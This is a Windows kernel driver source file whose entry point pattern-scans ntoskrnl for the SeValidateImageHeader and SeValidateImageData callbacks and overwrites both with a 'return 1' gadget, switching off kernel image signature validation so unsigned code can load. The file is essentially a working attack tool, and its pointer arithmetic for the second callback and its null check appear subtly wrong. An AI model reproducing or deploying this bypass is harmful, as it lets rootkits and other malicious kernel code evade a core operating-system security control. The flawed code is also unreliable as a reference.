#include <ntdef.h>
#include <stdint.h>
#include <ntifs.h>
#include <ntddk.h>
#include <ntimage.h>
#include <windef.h>
#include <intrin.h>
#include <ntstrsafe.h>

#include "structs/windows.h"

#include "utils/crt.h"
#include "utils/utils.h"

NTSTATUS DriverEntry( ) {
	
	auto ntoskrnl = get_kernel_module( "ntoskrnl.exe" );
	if ( !ntoskrnl )
		return STATUS_FAILED_DRIVER_ENTRY;
	auto se_validate_image_header = find_pattern( ntoskrnl, "\x48\x39\x35\xCC\xCC\xCC\xCC\x48\x8B\xF9", "xxx????xxx" );
	if ( !se_validate_image_header )
		return STATUS_FAILED_DRIVER_ENTRY;
	
	auto se_validate_image_data = find_pattern( ntoskrnl, "\x48\x8B\x05\xCC\xCC\xCC\xCC\x4C\x8B\xD1\x48\x85\xC0", "xxx????xxxxxx" ); 
	if ( !se_validate_image_data )
		return STATUS_FAILED_DRIVER_ENTRY;

	auto rva = se_validate_image_header + *( int32_t* )( se_validate_image_header + 3 ) + 7;
	auto rva2 = se_validate_image_data +  *( int32_t* )( se_validate_image_header + 3 ) + 7;
	if ( !rva && !rva2 ) {
		DbgPrintEx( 0, 0, "Fuck\n" );
		return STATUS_FAILED_DRIVER_ENTRY;
	}

	DbgPrintEx( 0, 0, "se_validate_image_header %llX\n", rva ); 
	DbgPrintEx( 0, 0, "se_validate_image_data %llX\n", rva2 );

	auto rop = find_pattern( ntoskrnl, "\xB8\x01\x00\x00\x00\xC3", "xxxxxx" ); 
	if ( !rop ) {
		DbgPrintEx( 0, 0, "Fuck\n" );
		return STATUS_FAILED_DRIVER_ENTRY;
	}

	//Swap
	*( uintptr_t* )rva = rop;
	*( uintptr_t* )rva2 = rop;

	DbgPrintEx( 0, 0, "Swapped to %llX\n", rop ); 

	return STATUS_SUCCESS;
}